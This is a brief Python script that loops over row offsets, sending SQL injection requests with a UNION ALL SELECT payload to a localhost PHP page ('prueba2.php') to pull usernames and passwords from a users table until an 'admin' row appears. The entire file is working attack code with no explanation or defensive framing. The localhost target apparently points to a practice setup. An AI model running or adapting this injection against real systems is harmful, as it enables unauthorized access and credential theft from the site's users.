import requests

for i in range(300000):
	url = "http://localhost/prueba2.php?id=4%20UNION%20ALL%20SELECT%201,u.user,u.pass,4%20FROM%20users%20u%20limit%20"+str(i)+",1--"
	response = requests.get(url).text
	if "admin" in response:
		print(response)
		break
